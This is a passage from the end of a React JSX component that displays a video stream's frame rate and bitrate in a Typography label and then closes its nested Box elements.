                }}>{fps} fps · {kbps} kb/s</Typography>
              </Box>
            )}
          </Box>
        )}
      </Box>
    </Box>
  );
}
